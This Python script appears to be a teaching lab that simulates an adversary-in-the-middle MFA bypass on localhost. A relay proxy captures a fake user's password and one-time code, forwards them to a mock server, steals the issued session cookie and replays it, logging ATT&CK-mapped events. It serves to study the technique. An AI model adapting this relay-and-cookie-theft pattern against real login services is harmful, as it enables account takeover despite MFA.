#!/usr/bin/env python3
"""
Week 6 - SAFE, SELF-CONTAINED lab that demonstrates the MECHANISM of
MITRE ATT&CK T1557 (Adversary-in-the-Middle), the defining technique of Tycoon2FA.

This is NOT phishing and contains NO real brand, domain, credential or malware. Everything
runs on 127.0.0.1 (localhost):

    victim client  ->  AiTM reverse proxy (attacker)  ->  "ACME Corp" auth server (legit)

The three parts are all started by this one script. The "victim" is a scripted HTTP client
using a dummy login (alice@acme.example / Passw0rd!) and a fake one-time code. The point is to
show how an attacker who sits in the middle relays the login to the real server, lets the real
MFA succeed, and then steals the issued session cookie - exactly the AiTM relay that defeats MFA.

Outputs (evidence for the report):
    sim_capture.log      - human-readable transcript of what the proxy saw and stole
    attack_events.ndjson - one JSON event per attacker action, for ATT&CK mapping (map_to_attack.py)

Run:  python3 attack_sim/aitm_lab.py
Only the Python standard library is used. Nothing leaves the machine.
"""
import http.server
import json
import threading
import time
import urllib.request
import uuid
from http.cookies import SimpleCookie
from pathlib import Path
from urllib.parse import parse_qs

HERE = Path(__file__).resolve().parent
LEGIT_PORT = 8721          # the real "ACME Corp" identity server
PROXY_PORT = 8722          # the attacker's adversary-in-the-middle reverse proxy
LEGIT = f"http://127.0.0.1:{LEGIT_PORT}"

DUMMY_USER = "alice@acme.example"      # fake user
DUMMY_PASS = "Passw0rd!"               # fake password (not a real secret)
DUMMY_OTP = "314159"                   # fake one-time code

events = []     # attacker telemetry, mapped to ATT&CK later
caplog = []     # human-readable transcript
VALID_SESSIONS = {}   # session cookies the legit server has issued


def log(line):
    caplog.append(line)
    print(line)


def event(action, attack_id, attack_name, detail):
    events.append({"ts": time.strftime("%Y-%m-%dT%H:%M:%S"), "actor": "attacker",
                   "action": action, "attack_id": attack_id, "attack_name": attack_name,
                   "detail": detail})


# ----------------------------------------------------------------------- legit server
class LegitHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def do_GET(self):
        # the real login page
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(b"<html><body><h1>ACME Corp Sign in</h1><form></form></body></html>")

    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        form = parse_qs(self.rfile.read(n).decode())
        user = form.get("user", [""])[0]
        pw = form.get("password", [""])[0]
        otp = form.get("otp", [""])[0]
        if user == DUMMY_USER and pw == DUMMY_PASS and otp == DUMMY_OTP:
            # MFA satisfied -> issue a real session cookie
            sid = "ACME-SESSION-" + uuid.uuid4().hex
            VALID_SESSIONS[sid] = user
            self.send_response(200)
            self.send_header("Set-Cookie", f"ACMEAUTH={sid}; HttpOnly; Path=/")
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "ok", "user": user}).encode())
        else:
            self.send_response(401)
            self.end_headers()
            self.wfile.write(b'{"status":"denied"}')


# ----------------------------------------------------------------------- attacker proxy
class AitmProxyHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def do_GET(self):
        # victim lands on the attacker's look-alike page; attacker serves a copy and logs the visit
        event("serve_fake_login", "T1557", "Adversary-in-the-Middle",
              "Reverse proxy serves a pixel-perfect copy of the ACME login page to the victim")
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(b"<html><body><h1>ACME Corp Sign in</h1><!-- proxied --></body></html>")

    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(n).decode()
        form = parse_qs(raw)
        user = form.get("user", [""])[0]
        pw = form.get("password", [""])[0]
        otp = form.get("otp", [""])[0]

        # 1) attacker SEES the credentials and MFA code as they pass through
        log(f"[proxy] intercepted credentials  user={user} password={pw}")
        event("capture_credentials", "T1557", "Adversary-in-the-Middle",
              f"Captured password in transit for {user}")
        log(f"[proxy] intercepted live MFA code otp={otp}")
        event("capture_mfa_code", "T1111", "Multi-Factor Authentication Interception",
              "Captured the one-time MFA code as the victim typed it")

        # 2) attacker RELAYS the same login to the real server (this is the AiTM relay)
        event("relay_to_real_service", "T1557", "Adversary-in-the-Middle",
              "Relayed the captured credentials + MFA code to the real ACME server in real time")
        data = raw.encode()
        req = urllib.request.Request(LEGIT, data=data,
                                     headers={"User-Agent": "axios/1.13.6",
                                              "Content-Type": "application/x-www-form-urlencoded"})
        with urllib.request.urlopen(req) as resp:
            body = resp.read()
            set_cookie = resp.headers.get("Set-Cookie", "")

        # 3) the real server issued a session cookie -> attacker STEALS it
        jar = SimpleCookie(set_cookie)
        stolen = jar["ACMEAUTH"].value if "ACMEAUTH" in jar else None
        if stolen:
            log(f"[proxy] STOLE session cookie   ACMEAUTH={stolen}")
            event("steal_session_cookie", "T1539", "Steal Web Session Cookie",
                  f"Stole the authenticated session cookie issued after MFA: {stolen[:24]}...")
            # 4) attacker exfiltrates the cookie to its own channel (here: a local file)
            (HERE / "stolen_cookie.txt").write_text(stolen, encoding="utf-8")
            event("exfiltrate_cookie", "T1567", "Exfiltration Over Web Service",
                  "Sent the stolen cookie to the attacker channel (simulated: Telegram bot)")

        # pass the response back to the victim so nothing looks wrong
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(body)


def serve(port, handler):
    httpd = http.server.HTTPServer(("127.0.0.1", port), handler)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    return httpd


def victim_logs_in():
    """Scripted victim: posts the dummy login to the ATTACKER's proxy (as if they clicked the lure)."""
    log(f"[victim] opening login page via link in phishing email -> http://127.0.0.1:{PROXY_PORT}")
    urllib.request.urlopen(f"http://127.0.0.1:{PROXY_PORT}/").read()
    log(f"[victim] typing password and the MFA code from the authenticator app")
    body = f"user={DUMMY_USER}&password={DUMMY_PASS}&otp={DUMMY_OTP}".encode()
    req = urllib.request.Request(f"http://127.0.0.1:{PROXY_PORT}/",
                                 data=body, headers={"User-Agent": "Mozilla/5.0 (victim browser)"})
    out = json.loads(urllib.request.urlopen(req).read())
    log(f"[victim] login looks successful: {out}  (victim suspects nothing)")


def attacker_replays_cookie():
    """Attacker uses the stolen cookie to act as the victim - no password, no MFA needed."""
    stolen = (HERE / "stolen_cookie.txt").read_text()
    log(f"[attacker] replaying stolen cookie from its own server (axios), no password needed")
    req = urllib.request.Request(LEGIT, headers={"Cookie": f"ACMEAUTH={stolen}",
                                                 "User-Agent": "axios/1.13.6"})
    # the legit server recognises the cookie as a valid, already-authenticated session
    ok = stolen in VALID_SESSIONS
    event("replay_stolen_cookie", "T1550.004", "Use Alternate Authentication Material: Web Session Cookie",
          "Authenticated as the victim using only the stolen cookie, bypassing password and MFA")
    log(f"[attacker] access as {VALID_SESSIONS.get(stolen,'?')} granted = {ok}  <-- MFA fully bypassed")


def main():
    serve(LEGIT_PORT, LegitHandler)
    serve(PROXY_PORT, AitmProxyHandler)
    time.sleep(0.3)
    log("=== T1557 Adversary-in-the-Middle: safe localhost lab (all data is fake) ===")
    log(f"legit ACME server : {LEGIT}")
    log(f"attacker AiTM proxy: http://127.0.0.1:{PROXY_PORT}\n")
    victim_logs_in()
    log("")
    attacker_replays_cookie()
    log("\n=== result: the kit never needed the password or MFA again - it has the session ===")

    (HERE / "sim_capture.log").write_text("\n".join(caplog) + "\n", encoding="utf-8")
    with open(HERE / "attack_events.ndjson", "w", encoding="utf-8") as f:
        for e in events:
            f.write(json.dumps(e) + "\n")
    log(f"\nwrote sim_capture.log and attack_events.ndjson ({len(events)} attacker events)")


if __name__ == "__main__":
    main()
